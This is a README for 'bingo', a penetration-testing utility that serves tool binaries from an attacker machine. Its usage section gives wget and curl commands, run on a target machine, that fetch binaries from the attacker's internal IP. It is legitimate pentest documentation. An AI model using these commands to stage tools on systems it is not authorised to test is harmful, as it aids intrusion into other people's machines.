# bingo - Penetration Testing Toolkit

bingo facilitates the distribution and execution of essential tools for penetration testing, allowing the attacker to fetch them on the target machine without internet access on it.

## Installation

1. **Clone the Repository:**
   ```bash
   git clone https://github.com/luskabol/bingo.git
   cd bingo

2. **Install dependencies**
    ```bash
    pip install -r requirements.txt

## Usage

1. **On the attacker machine:**
    ```bash
    python3 bingo.py
    ```

2. **On the target machine:**
    ```bash
    wget http://{your-internal-IP}:8000/get/{binary-name} -O {path-to-output-file}
    ```

    **If the target doesn't have wget:**
    ```bash
    curl http://{your-internal-IP}:8000/get/{binary-name} -o {path-to-output-file}
    ```

- Replace {your-internal-IP} with the actal internal IP of the attacking machine.

- Replace {binary-name} with the name of the binary you want to get, check `bingo.yaml` for available binaries.

- Replace {path-to-output-file} with the location where you want to save the binary.
